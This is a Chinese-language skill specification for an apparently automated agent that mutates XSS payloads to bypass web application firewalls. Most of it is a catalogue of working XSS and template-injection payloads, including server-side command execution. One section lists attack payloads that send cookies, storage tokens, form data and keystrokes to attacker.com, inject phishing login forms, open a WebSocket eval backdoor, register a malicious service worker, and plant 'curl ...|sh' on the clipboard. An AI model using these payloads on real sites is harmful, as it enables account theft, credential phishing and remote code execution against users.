# XSS 语义变异 Skill

## 核心任务

基于漏洞语义理解的结果，提出具体的 XSS `part_operations`，通过改变 XSS Payload 的语法表达方式来绕过 WAF，同时保持原始验证目标。

## XSS 攻击类型识别（第一步：读 base_parts 时确定）

根据 `base_parts` 中的 `context_prefix` 和 `label` 判断基础 Payload 属于哪一类 XSS 攻击，你的变异必须**保留同一攻击类别**：

| 攻击类别 | 典型基础 Payload | 识别特征 | 变异空间 |
|---------|-----------------|---------|---------|
| **传统 HTML 标签型** | `<script>alert(1)</script>` | 包含 `<tag>` 结构 | 标签替换 + 事件替换 + JS 表达式改写 |
| **模板注入型（ERB/JSP）** | `<%= system('id') %>` | `<%=` 或 `<%` 开头 | 表达式改写 + 函数替换 + 对象引用 |
| **模板引擎型（Angular/Vue）** | `{{constructor.constructor('alert(1)')()}}` | `{{` 开头 | 构造器链改写 + 表达式等价 |
| **JS 模板字面量型** | `${alert(document.domain)}` | `${` 开头 | JS 表达式改写 + 函数替换 |
| **属性注入型** | `" onload="alert(1)` | 引号 + 事件处理器 | 事件替换 + 表达式改写 + 引号变换 |
| **纯 JS 上下文型** | `'-alert(1)-'` | 引号包裹的 JS 函数调用 | 函数替换 + 运算符变换 + 字符串操作 |

**判定规则：**
- 基础 Payload 若含 `<%` → 模板注入类；变异不能删除模板标记。
- 基础 Payload 若含 `{{` → 模板引擎类；变异保留双花括号结构。
- 基础 Payload 若含 `${` → JS 模板字面量类；保留模板语法。
- 基础 Payload 若以引号 + 事件开头 → 属性注入类；保留引号边界。
- 基础 Payload 若为纯 JS 函数调用（无 HTML） → JS 上下文类；保留函数调用语义。

## 变异策略层次

变异从浅到深分为 4 个层次，**优先使用深层策略**：

### L1：同义替换（最浅——仅改变表面表达）
```
<script> → <img>                           （标签替换）
alert(1) → prompt(1)                       （函数替换）
```

### L2：结构重组（中等——改变 Payload 的语法组织）
```
<script>alert(1)</script> → <svg onload=alert(1)> （标签+事件双重变化）
```

### L3：间接引用与控制流（深层——引入中间层）
```
alert(1) → Function('alert(1)')()          （动态函数构造）
alert(1) → setTimeout('alert(1)')          （定时器包装）
```

### L4：浏览器特性利用（最深——利用浏览器特异性）
```
alert → self[String.fromCharCode(97,108,101,114,116)]  （字符码构造）
<script> → <ScRiPt>                        （大小写混淆）
onerror=alert(1) → onerror=alert&#40;1&#41; （HTML 实体编码）
```

## XSS 变异技术目录

### 技术 1：标签+事件组合变换
- **原理**：改变 HTML 标签和事件处理器的组合
- **适用部件**：标签类型、事件处理器
- **示例**：
  ```
  <script>alert(1)</script>
  → <img src=x onerror=alert(1)>
  → <svg onload=alert(1)>
  → <body onload=alert(1)>
  → <details open ontoggle=alert(1)>
  → <input autofocus onfocus=alert(1)>
  → <marquee onstart=alert(1)>
  → <video><source onerror=alert(1)>
  → <audio src=x onerror=alert(1)>
  → <iframe srcdoc="<script>alert(1)</script>">
  ```

### 技术 2：JS 表达式变换
- **原理**：改变 JavaScript 函数调用方式
- **适用部件**：JS 表达式
- **示例**：
  ```
  alert(1)
  → prompt(1)
  → confirm(1)
  → (alert)(1)
  → window.alert(1)
  → top['alert'](1)
  → self[String.fromCharCode(97,108,101,114,116)](1)
  → Function('alert(1)')()
  → setTimeout('alert(1)')
  → setInterval('alert(1)')
  ```

### 技术 3：标签与属性大小写混合
- **原理**：利用 HTML 大小写不敏感特性
- **适用部件**：标签名、属性名
- **示例**：
  ```html
  <script> → <ScRiPt> → <SCRIPT> → <sCrIpT>
  onerror → oNeRrOr → ONERROR → OnErRoR
  ```

### 技术 4：特殊属性与伪协议
- **原理**：使用支持 JavaScript 伪协议的特殊属性
- **适用部件**：标签属性
- **示例**：
  ```html
  <a href=javascript:alert(1)>
  <iframe src=javascript:alert(1)>
  <embed src=javascript:alert(1)>
  <object data=javascript:alert(1)>
  <form action=javascript:alert(1)>
  <isindex action=javascript:alert(1)>
  ```

### 技术 5：事件处理器变体
- **原理**：使用不同的事件处理器触发 JavaScript
- **适用部件**：事件属性
- **示例**：
  ```html
  onload → onpageshow → DOMContentLoaded → onbeforeload
  onerror → onerror\n=alert → onerror%0a=alert
  onclick → ondblclick → onmousedown → onmouseup
  ```

### 技术 6：无引号属性与编码
- **原理**：省略引号或使用 HTML 实体/转义
- **适用部件**：属性值
- **示例**：
  ```html
  <img src=x onerror=alert(1)>  （无引号）
  <img src=x onerror=alert&#40;1&#41;>  （HTML 实体）
  <img src=x onerror=alert(1)>  （Unicode 转义）
  <img src=x onerror=eval('\x61lert(1)')>  （Hex 转义）
  ```

### 技术 7：标签闭合变体
- **原理**：省略闭合标签或使用注释截断
- **适用部件**：标签结构
- **示例**：
  ```html
  <script>alert(1)</script> → <script>alert(1)//
  <img src=x onerror=alert(1)> → <img src=x onerror=alert(1)//
  <svg><script>alert(1)</script></svg> → <svg><script>alert(1)
  ```

### 技术 8：嵌套标签与自闭合
- **原理**：利用嵌套标签或自闭合标签触发事件
- **适用部件**：标签组合
- **示例**：
  ```html
  <video><source onerror=alert(1)>
  <audio><source onerror=alert(1)>
  <picture><source onerror=alert(1)>
  <svg><animate onbegin=alert(1)>
  <svg><set onbegin=alert(1)>
  <math><maction actiontype=toggle selection=alert(1)>
  ```

### 技术 9：HTML5 媒体标签事件链
- **原理**：利用 HTML5 媒体标签的丰富事件模型
- **适用部件**：video/audio 标签事件
- **示例**：
  ```html
  <video onloadstart=alert(1)><source>
  <audio oncanplay=alert(1) src=x>
  <video ontimeupdate=alert(1) autoplay src=x>
  <audio onseeking=alert(1) controls src=x>
  <video ondurationchange=alert(1) src=x>
  <audio onvolumechange=alert(1) src=x>
  ```

### 技术 10：模板注入表达式变换（ERB/JSP）
- **原理**：改变模板标记内的代码执行方式
- **适用部件**：javascript_expression（模板注入类）
- **示例**：
  ```ruby
  <%= system('id') %>
  → <%= `id` %>                                    # 反引号命令执行
  → <%= exec('id') %>                              # exec 函数
  → <%= IO.popen('id').read %>                     # IO.popen
  → <%= %x(id) %>                                  # %x 字面量
  
  <%= global.process.mainModule.require('child_process').execSync('id') %>
  → <%= process.mainModule.require('child_process').exec('id') %>
  → <%= require('child_process').spawn('id') %>
  → <%= global.process.binding('spawn_sync').spawn({file:'id',args:[]}) %>
  ```

### 技术 11：模板引擎构造器链变换（Angular/Vue/Handlebars）
- **原理**：改变访问 constructor/proto 的路径和方式
- **适用部件**：javascript_expression（模板引擎类）
- **示例**：
  ```javascript
  {{constructor.constructor('alert(1)')()}}
  → {{_c.constructor('alert(1)')()}}               # 简写引用
  → {{$on.constructor('alert(1)')()}}              # Vue $on
  → {{''.constructor.prototype.charAt=''.constructor.constructor('alert(1)')}}
  → {{[].constructor.constructor('alert(1)')()}}   # 数组构造器
  → {{(1).constructor.constructor('alert(1)')()}}  # 数字构造器
  
  {{7*7}}                                          # 模板表达式测试
  → {{[].pop.constructor('alert(1)')()}}
  → {{x.__proto__.constructor.constructor('alert(1)')()}}
  → {{this.constructor.constructor('alert(1)')()}}
  ```

### 技术 12：JS 模板字面量表达式变换
- **原理**：改变 ${} 内的 JavaScript 表达式
- **适用部件**：javascript_expression（模板字面量类）
- **示例**：
  ```javascript
  ${alert(document.domain)}
  → ${prompt(document.domain)}                     # 函数替换
  → ${confirm(document.domain)}
  → ${eval('alert(document.domain)')}              # eval 包装
  → ${Function('alert(document.domain)')()}        # Function 构造器
  → ${setTimeout('alert(document.domain)')}        # 定时器
  → ${[].constructor.constructor('alert(document.domain)')()}  # 构造器链
  → ${window['ale'+'rt'](document.domain)}         # 字符串拼接
  → ${(alert)(document.domain)}                    # 括号包装
  → ${self.alert(document.domain)}                 # self 引用
  ```

### 技术 13：属性注入事件处理器变换
- **原理**：改变事件类型和引号边界
- **适用部件**：event_handler, context_prefix（属性注入类）
- **示例**：
  ```html
  " onload="alert(1)
  → " onerror="alert(1)                            # 事件替换
  → " onfocus="alert(1)
  → " onmouseover="alert(1)
  → ' onload='alert(1)                             # 引号类型变换
  → " onload=alert(1)                              # 省略引号
  → " onload="prompt(1)                            # 函数替换
  → " onload="eval('alert(1)')                     # eval 包装
  → " onclick="alert(1)
  → " ontoggle="alert(1)
  ```

### 技术 14：纯 JS 上下文函数变换
- **原理**：改变 JavaScript 函数调用方式和运算符
- **适用部件**：javascript_expression（JS 上下文类）
- **示例**：
  ```javascript
  '-alert(document.domain)-'
  → '-prompt(document.domain)-'                    # 函数替换
  → '-confirm(document.domain)-'
  → '+alert(document.domain)+'                     # 运算符变换
  → '*alert(document.domain)*'
  → '/alert(document.domain)/'
  → '-(alert)(document.domain)-'                   # 括号包装
  → '-window.alert(document.domain)-'              # window 引用
  → '-self.alert(document.domain)-'                # self 引用
  → '-eval("alert(document.domain)")-'             # eval 包装
  → '-Function("alert(document.domain)")()-'       # Function 构造器
  → '-(()=>alert(document.domain))()-'             # 箭头函数
  ```

## 高级攻击 Payload 目录

### 窃取敏感数据类

#### Cookie 窃取
```html
<img src=x onerror=fetch('http://attacker.com/?c='+document.cookie)>
<svg onload=new Image().src='http://attacker.com/?c='+document.cookie>
<script>navigator.sendBeacon('http://attacker.com',document.cookie)</script>
<iframe srcdoc="<script>parent.location='http://attacker.com/?c='+document.cookie</script>">
```

#### LocalStorage/SessionStorage 窃取
```html
<img src=x onerror=fetch('http://attacker.com/?d='+localStorage.getItem('token'))>
<svg onload=fetch('http://attacker.com',{method:'POST',body:JSON.stringify({ls:localStorage,ss:sessionStorage})})>
<script>fetch('http://attacker.com/?s='+sessionStorage.getItem('session'))</script>
```

#### 表单数据窃取
```html
<img src=x onerror="Array.from(document.forms).forEach(f=>fetch('http://attacker.com',{method:'POST',body:new FormData(f)}))">
<svg onload="fetch('http://attacker.com',{method:'POST',body:JSON.stringify(Object.fromEntries(new FormData(document.querySelector('form'))))})">
```

#### 键盘记录器
```html
<img src=x onerror="document.onkeypress=e=>fetch('http://attacker.com/?k='+e.key)">
<svg onload="document.addEventListener('keydown',e=>navigator.sendBeacon('http://attacker.com',e.key))">
```

#### 页面截图（实验性）
```html
<img src=x onerror="html2canvas(document.body).then(c=>fetch('http://attacker.com',{method:'POST',body:c.toDataURL()}))">
```

### 页面操作类

#### 钓鱼页面注入
```html
<img src=x onerror="document.body.innerHTML='<form action=http://attacker.com method=POST><input name=user placeholder=Username><input name=pass type=password placeholder=Password><button>Login</button></form>'">
<svg onload="document.documentElement.innerHTML='<style>body{margin:0;font-family:Arial}</style><div style=text-align:center;padding:50px><h1>Session Expired</h1><form action=http://attacker.com method=POST><input name=u placeholder=Email style=padding:10px;margin:5px;width:200px><br><input name=p type=password placeholder=Password style=padding:10px;margin:5px;width:200px><br><button style=padding:10px 20px;background:#007bff;color:white;border:none;cursor:pointer>Re-authenticate</button></form></div>'">
```

#### 页面重定向
```html
<img src=x onerror=location='http://attacker.com'>
<svg onload=window.location.href='http://attacker.com'>
<script>top.location='http://attacker.com'</script>
<meta http-equiv=refresh content="0;url=http://attacker.com">
```

#### DOM 篡改
```html
<img src=x onerror="document.querySelector('.price').innerText='$0.01'">
<svg onload="document.querySelector('.admin-link').style.display='block'">
<script>document.querySelectorAll('a').forEach(a=>a.href='http://attacker.com')</script>
```

### 持久化与隐蔽类

#### Service Worker 注入
```html
<img src=x onerror="navigator.serviceWorker.register('data:application/javascript,self.onfetch=e=>e.respondWith(fetch(`http://attacker.com/log?url=${e.request.url}`).then(()=>fetch(e.request)))').catch(e=>0)">
```

#### WebSocket 反向 Shell
```html
<img src=x onerror="ws=new WebSocket('ws://attacker.com');ws.onmessage=e=>eval(e.data)">
```

#### 无限弹窗 DoS
```html
<img src=x onerror="setInterval(()=>window.open('about:blank'),100)">
<svg onload="while(1)alert(1)">
```

### 冷门技术类

#### CSS Injection 转 XSS
```html
<style>*{background:url('http://attacker.com/?css=leak')}</style>
<link rel=stylesheet href="data:text/css,body{background:url('http://attacker.com')}">
```

#### SVG 动画触发
```html
<svg><animate attributeName=x dur=1s repeatCount=indefinite onbegin=alert(1) />
<svg><set attributeName=x to=0 onbegin=alert(document.domain) />
<svg><animateTransform onbegin=alert(1) attributeName=transform />
```

#### WebRTC 本地 IP 泄露
```html
<img src=x onerror="pc=new RTCPeerConnection({iceServers:[]});pc.createDataChannel('');pc.createOffer().then(o=>pc.setLocalDescription(o));pc.onicecandidate=e=>e.candidate?fetch('http://attacker.com/?ip='+e.candidate.candidate):0">
```

#### Mutation Observer 监听
```html
<img src=x onerror="new MutationObserver(m=>m.forEach(e=>fetch('http://attacker.com',{method:'POST',body:JSON.stringify({type:e.type,target:e.target.outerHTML})}))).observe(document,{childList:true,subtree:true,attributes:true})">
```

#### 剪贴板劫持
```html
<img src=x onerror="document.addEventListener('copy',e=>{e.clipboardData.setData('text/plain','curl http://attacker.com/mal.sh|sh');e.preventDefault()})">
<svg onload="setInterval(()=>navigator.clipboard.writeText('curl http://attacker.com/mal.sh|sh'),1000)">
```

#### Beacon API 隐蔽外传
```html
<img src=x onerror="navigator.sendBeacon('http://attacker.com',new Blob([JSON.stringify({cookie:document.cookie,localStorage:localStorage,sessionStorage:sessionStorage,dom:document.documentElement.outerHTML})],{type:'application/json'}))">
```

#### Prototype Pollution XSS
```html
<img src=x onerror="Object.prototype.src='x';Object.prototype.onerror=alert(1);document.createElement('img')">
```

#### PDF XSS（在 PDF viewer 中）
```html
<embed src="data:application/pdf,<script>alert(1)</script>">
<object data="data:application/pdf,<script>alert(document.domain)</script>">
```

#### Data URI Scheme
```html
<iframe src="data:text/html,<script>alert(parent.document.cookie)</script>">
<embed src="data:text/html,<img src=x onerror=alert(document.domain)>">
<object data="data:text/html,<svg onload=alert(1)>">
```

#### MIME Confusion
```html
<script src="data:,alert(document.domain)"></script>
<script src="data:text/javascript,alert(1)"></script>
<link rel=import href="data:text/html,<script>alert(1)</script>">
```

#### 时间延迟检测
```html
<img src=x onerror="setTimeout(()=>alert('Still here after 10s'),10000)">
<svg onload="let t=Date.now();while(Date.now()-t<5000);alert('Blocked for 5s')">
```

#### 多阶段 Payload
```html
<!-- Stage 1: 加载器 -->
<img src=x onerror="s=document.createElement('script');s.src='http://attacker.com/stage2.js';document.body.appendChild(s)">

<!-- Stage 2: 实际攻击代码通过外部加载 -->
```

#### 利用 CORS 错误配置
```html
<img src=x onerror="fetch('http://victim.com/api/user',{credentials:'include'}).then(r=>r.json()).then(d=>fetch('http://attacker.com',{method:'POST',body:JSON.stringify(d)}))">
```

## 变异原则检查清单

每轮提出操作前，确认：
- [ ] 每个操作的目标部件存在且类型正确
- [ ] 不删除 required=true 的部件
- [ ] 至少有一个实质性的语义变化
- [ ] 没有使用编码/解码/转义（属于编码 Agent 的职责）
- [ ] 保持了原始验证目标（如弹窗功能）
- [ ] 没有引入破坏性操作（如窃取 Cookie、重定向）
- [ ] 优先选择 `available_directions` 中未使用的方向
- [ ] **保持攻击类别**：变异后的 Payload 必须保留原始攻击类别
  - 模板注入类（`<%=` / `<%`）→ 保留模板标记，只改变内部表达式
  - 模板引擎类（`{{`）→ 保留双花括号，改变构造器链或表达式
  - JS 模板字面量类（`${`）→ 保留 `${}` 结构，改变内部 JS 表达式
  - 属性注入类（引号 + 事件）→ 保留引号边界和事件结构
  - 纯 JS 上下文类 → 保留函数调用语义，改变函数或运算符
- [ ] **非标签型 XSS 不能转换为标签型**：不要把 `{{...}}` 改成 `<script>`，不要把 `${...}` 改成 `<img>`
- [ ] 与本轮其他候选**在表达式/函数/构造器层面**显著不同

